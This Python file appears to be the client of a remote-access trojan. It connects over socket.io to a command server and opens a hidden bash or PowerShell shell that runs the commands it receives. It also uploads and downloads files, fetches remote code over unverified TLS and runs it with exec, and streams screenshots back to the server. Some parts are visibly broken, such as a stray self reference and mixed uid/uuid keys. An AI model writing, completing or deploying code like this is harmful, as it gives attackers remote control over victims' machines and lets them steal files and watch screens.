import subprocess
import threading
import multiprocessing
import platform
import socketio
import sys
import base64
import ssl
from urllib.request import urlopen
import importlib.util
import cv2
import dxcam

def run(data):

    def create_moduel(url):
        # Create an SSL context that doesn't verify certificates
        context = ssl._create_unverified_context()
        # Use the context when opening the URL
        with urlopen(url, context=context) as response:
            code = response.read().decode('utf-8')
    
        spec = importlib.util.spec_from_loader('temp', loader=None)
        module = importlib.util.module_from_spec(spec)
    
        # Execute the code in the module's namespace
        exec(code, module.__dict__)
    
        return module

    sio = socketio.Client(logger=False, engineio_logger=False)

    system = platform.system()

    global shell

    if system == "Linux" or system == "Darwin":
        shellScript = "bash"
    elif system == 'Windows':
        shellScript = "powershell"
    else:
        shellScript = "bash"

    class InteractiveShell:

        def __init__(self):
            self.process = None
            self.running = False

        def start(self):
            self.running = True
            self.process = subprocess.Popen(
                [shellScript],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                shell=True,
                universal_newlines=True,
            )

            # Start threads for handling output and error
            output_thread = threading.Thread(target=self.read_output, args=(self.process.stdout,))
            error_thread = threading.Thread(target=self.read_output, args=(self.process.stderr,))
            output_thread.start()
            error_thread.start()

            # Wait for both threads to finish
            output_thread.join()
            error_thread.join()

        def read_output(self, pipe):
            while self.running:
                output = pipe.readline().rstrip()
                if output:
                    sio.emit("result", output)

    # Define event handlers outside the class
    @sio.on("command")
    def command(data_new):
        if data['uuid'] == data_new['id']:
            shell.process.stdin.write(data_new['cmd'] + "\n")
            shell.process.stdin.flush()

    @sio.on('restart')
    def restart(data_new):
        global shell  # Declare shell as global to modify it
        if data_new == data['uuid']:
            if shell.process:
                shell.process.terminate()
                shell.running = False
            shell = InteractiveShell()  # Create a new InteractiveShell instance
            shell.start()  # Start the new shell process

    @sio.event
    def connect():
        sio.emit("mConnect", data)
        print(sio.sid)
        print(data["uuid"])

    
    @sio.on('upload_file')
    def upload_file(data_new):
        if data['uuid'] == data_new['uuid']:
            print(data_new['file_name'])
            with open(data_new['file_name'], 'wb') as f:
                decoded_data = base64.b64decode(data_new['file'])
                f.write(decoded_data)


    @sio.on("download_file")
    def download_file(data_new):
        if data['uuid'] == data_new['uuid']:
            with open(data_new['file_path'], 'rb') as f:
                file = f.read()
            file_ready = base64.b64encode(file).decode('utf-8')
            sio.emit('download_file_return', {'uuid': data_new['uuid'], 'file_name': data_new['file_path'], 'file': file_ready})
            print("emited")


    @sio.on("pem")
    def pem(data_new):
        if data['uuid'] == data_new['uuid']:
            print(data['url']+data_new['url'])
            moduel = create_moduel(data['url']+data_new['url'])
            moduel.run(sio, data['uuid'])

    screenshot_thread = multiprocessing.Process(target=self.take_screenshots, args=(sio, data['uid']))
    @sio.on("screen_status")
    def screen_status(data_new):
        if data['uid'] == data_new['uid']:
            if data['status'] == "start":
                screenshot_thread.start()
            else:
                screenshot_thread.terminate()


    def take_screenshots(sio, uid):
        camera = dxcam.create()
        screenshot = camera.grab()

        _, buffer = cv2.imencode('.png', screenshot)
        sio.emit("screenshot", {"uid": uid, "image": base64.b64encode(buffer).decode('utf-8')})




    sio.connect(data['url'])

    shell = InteractiveShell()
    shell.start()
    sio.wait()